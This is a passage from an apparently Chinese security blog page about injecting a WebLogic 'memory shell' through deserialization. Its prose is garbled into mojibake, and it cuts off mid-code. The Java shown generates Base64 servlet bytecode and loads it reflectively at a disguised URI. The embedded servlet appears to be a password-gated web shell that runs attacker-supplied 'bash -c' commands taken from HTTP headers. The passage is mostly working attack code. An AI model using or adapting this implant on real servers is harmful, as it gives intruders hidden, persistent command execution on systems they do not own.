</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServletGenByteCode</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String bytecode<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>bytecode<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å®Œæ•´ååºåˆ—åŒ–ï¼Œå®‰è£…å†…å­˜é©¬ï¼šmemsi.java</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-69>69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-70>70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-71>71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-72>72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-73>73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-74>74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-75>75</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.utils.ServletMapping<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.Servlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.InvocationTargetException<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Method<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsi</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>memsi</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        Class memsHttpServlet<span style=color:#f92672>=</span><span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            String pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADEAbgoAGgAyCAAzCwA0ADUIADYKAAYANwcAOAgAOQgAOggAOwcAPAoAPQA+CgA9AD8KAEAAQQoACgBCCABDCgAKAEQLAEUARgoACgBHCgAKAEgIAEkKAEoASwcATAcATQoAFwBOBwBsBwBQAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABpMcGVycy9uZW8vbWVtc0h0dHBTZXJ2bGV0OwEABWRvR2V0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAGcGFzc3dkAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY21kYXJyYXkBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAFG1lbXNIdHRwU2VydmxldC5qYXZhDAAbABwBAA94LWZvcndhcmRlZC1mdXIHAFEMAFIAUwEADG5lb3M0eWgzbGwwIQwAVABVAQAQamF2YS9sYW5nL1N0cmluZwEABGJhc2gBAAItYwEAD3gtZm9yd2FyZGVkLWZhcgEAEWphdmEvdXRpbC9TY2FubmVyBwBWDABXAFgMAFkAWgcAWwwAXABdDAAbAF4BAAJcQQwAXwBgBwBhDABiAGMMAGQAZQwAZgBnAQAABwBoDABpAGoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MABsAawEAGHBlcnMvbmVvL21lbXNIdHRwU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABlwZXJzL25lby9tZW1zSHR0cFNlcnZsZXRiAQAbTHBlcnMvbmVvL21lbXNIdHRwU2VydmxldGI7ACEAGQAaAAAAAAACAAEAGwAcAAEAHQAAAC8AAQABAAAABSq3AAGxAAAAAgAeAAAABgABAAAABwAfAAAADAABAAAABQAgAG0AAAAEACIAIwABAB0AAAEAAAUABgAAAHIrEgK5AAMCAE4SBC22AAWaAASxBr0ABlkDEgdTWQQSCFNZBSsSCbkAAwIAUzoEuwAKWbgACxkEtgAMtgANtwAOEg+2ABA6BSy5ABEBABkFtgASmQALGQW2ABOnAAUSFLYAFacADzoFuwAXWRkFtwAYv7EAAQAuAGIAZQAWAAIAHgAAACYACQAAAAoACQALABMADQAuABIARwATAGIAFgBlABQAZwAVAHEAFwAfAAAASAAHAEcAGwAkACUABQBnAAoAJgAnAAUAAAByACAAbQAAAAAAcgAoACkAAQAAAHIAKgArAAIACQBpACwALQADAC4ARAAuAC8ABAABADAAAAACADE=&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            Method defineClass<span style=color:#f92672>=</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;defineClass&#34;</span><span style=color:#f92672>,</span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span><span style=color:#f92672>{</span><span style=color:#75715e>//in case we may want to replay memsi request
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                memsHttpServlet<span style=color:#f92672>=(</span>Class<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
